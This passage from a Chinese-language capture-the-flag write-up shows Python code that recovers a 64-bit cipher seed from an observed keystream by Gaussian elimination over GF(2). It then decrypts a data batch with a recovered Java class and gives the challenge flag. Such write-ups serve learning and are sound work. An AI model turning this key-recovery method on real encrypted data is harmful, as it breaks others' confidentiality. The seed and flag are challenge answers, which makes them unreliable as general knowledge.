        rhs.append(d_bits[j])

    # GF(2) 高斯消元
    piv = [-1]*64
    r = 0
    for c in range(64):
        pivot = None
        for rr in range(r, n_eq):
            if (rows[rr]>>c)&1:
                pivot = rr
                break
        if pivot is None:
            continue
        rows[r], rows[pivot] = rows[pivot], rows[r]
        rhs[r],  rhs[pivot]  = rhs[pivot],  rhs[r]
        piv[c] = r
        for rr in range(n_eq):
            if rr != r and ((rows[rr]>>c)&1):
                rows[rr] ^= rows[r]
                rhs[rr]  ^= rhs[r]
        r += 1

    # 回代
    x = 0
    for c in range(63, -1, -1):
        pr = piv[c]
        if pr == -1:
            continue
        rest = rows[pr] & ~(1<<c)
        s = rhs[pr] ^ (bin(rest & x).count("1") & 1)
        if s:
            x |= (1<<c)
    return x

# 观测 keystream：来自 C XOR P
K_obs = Path("out/ks_prefix.bin").read_bytes()
seed = solve_seed_from_keystream(K_obs, prefix_bytes=16)
print("seed =", f"{seed:016x}")
```

得到seed：a91b1bb4e8978bda

 用seed 解 batch2，得到 Image1Part2 / Image1Part4

```Rust
java -cp work/recovered_classes:. Decrypt work/key0.b64 a91b1bb4e8978bda \
  work/batches/batch2_cipher.bin work/out/batch2_plain.bin
```

然后像 batch1/batch3 一样切片 + LZRR 解压 + 提取 base64，即可得到flag_part_2.jpg和flag_part_4.jpg

最后写个脚本拼起来得到完整图片：

![img](/img/2026-alictf/28.png)

flag为：`alictf{5a8e0fb1-d3f5-4b13-8424-164faab9bbd2}`
